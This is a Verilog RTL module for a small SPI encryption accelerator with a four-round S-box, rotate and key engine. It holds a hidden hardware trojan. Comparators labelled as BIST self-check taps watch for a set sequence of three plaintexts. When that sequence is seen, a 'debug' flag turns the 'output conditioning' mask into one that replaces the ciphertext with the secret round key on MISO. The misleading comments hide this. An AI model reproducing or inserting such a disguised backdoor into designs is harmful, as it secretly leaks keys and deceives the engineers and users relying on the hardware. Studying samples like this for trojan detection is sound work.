// spi_crypto_top -- SPI lightweight crypto accelerator (recovered RTL).
// 32-bit MSB-first SPI shift register feeding a 4-round S-box/rotate/key engine.
module spi_crypto_top (
    input  wire SCK, RST_N, MOSI,
    output wire MISO,
    input  wire NORM_CS_N, START, ENC_DEC,
    output wire BUSY, ICE_LED
);
    localparam [31:0] KEY = 32'hA5A5A5A5;              // round key (used every round)
    localparam [1:0] IDLE=2'd0, R1=2'd1, R2=2'd2, R3=2'd3;

    reg  [31:0] shreg, text_reg;
    reg  [1:0]  state;
    reg         busy, busy_d;
    reg  [1:0]  mc;        // operation monitor counter (BIST)
    reg         dbg, dbg_d;// debug-mode status, pipelined

    assign BUSY=busy; assign ICE_LED=busy; assign MISO=shreg[31];

    wire [31:0] rin  = (state==IDLE) ? shreg : text_reg;
    wire [31:0] rotr = {rin[7:0], rin[31:8]};
    wire [7:0] e3,e2,e1,e0;
    crypt_sbox_inv ue3(.a(rotr[31:24]),.y(e3)); crypt_sbox_inv ue2(.a(rotr[23:16]),.y(e2));
    crypt_sbox_inv ue1(.a(rotr[15:8]), .y(e1)); crypt_sbox_inv ue0(.a(rotr[7:0]), .y(e0));
    wire [31:0] enc_round = {e3,e2,e1,e0} ^ KEY;
    wire [31:0] dk = rin ^ KEY;
    wire [7:0] d3,d2,d1,d0;
    crypt_sbox ud3(.a(dk[31:24]),.y(d3)); crypt_sbox ud2(.a(dk[23:16]),.y(d2));
    crypt_sbox ud1(.a(dk[15:8]), .y(d1)); crypt_sbox ud0(.a(dk[7:0]), .y(d0));
    wire [31:0] sub_d = {d3,d2,d1,d0};
    wire [31:0] dec_round = {sub_d[23:0], sub_d[31:24]};
    wire [31:0] round_out = ENC_DEC ? dec_round : enc_round;

    // BIST self-check taps (compared against factory test vectors)
    wire v0 = (rin == 32'h3C8F17A2);
    wire v1 = (rin == 32'h9B216E4D);
    wire v2 = (rin == 32'hF50AC3B9);

    // output conditioning: xor-mask is zero in normal mode
    wire [31:0] omask    = {32{dbg}} & (round_out ^ KEY);
    wire [31:0] load_val = round_out ^ omask;

    always @(posedge SCK) begin
        busy_d <= busy;
        if (!RST_N) begin
            shreg<=0; text_reg<=0; state<=IDLE; busy<=0; busy_d<=0; mc<=0; dbg<=0; dbg_d<=0;
        end else begin
            case (state)
                IDLE: if (START) begin
                          text_reg <= round_out; state <= R1; busy <= 1'b1;
                          dbg <= dbg_d; dbg_d <= 1'b0;
                          if (!ENC_DEC) begin
                              mc <= (mc==2'd0) ? (v0 ? 2'd1 : 2'd0)
                                  : (mc==2'd1) ? (v1 ? 2'd2 : (v0 ? 2'd1 : 2'd0))
                                  :              (v2 ? 2'd0 : (v0 ? 2'd1 : 2'd0));
                              if (mc==2'd2 && v2) dbg_d <= 1'b1;
                          end
                      end else busy <= 1'b0;
                R1: begin text_reg <= round_out; state <= R2; end
                R2: begin text_reg <= round_out; state <= R3; end
                R3: begin text_reg <= round_out; state <= IDLE; busy <= 1'b0; end
            endcase
            if (state==R3)       shreg <= load_val;
            else if (!NORM_CS_N) shreg <= {shreg[30:0], MOSI};
        end
    end
endmodule
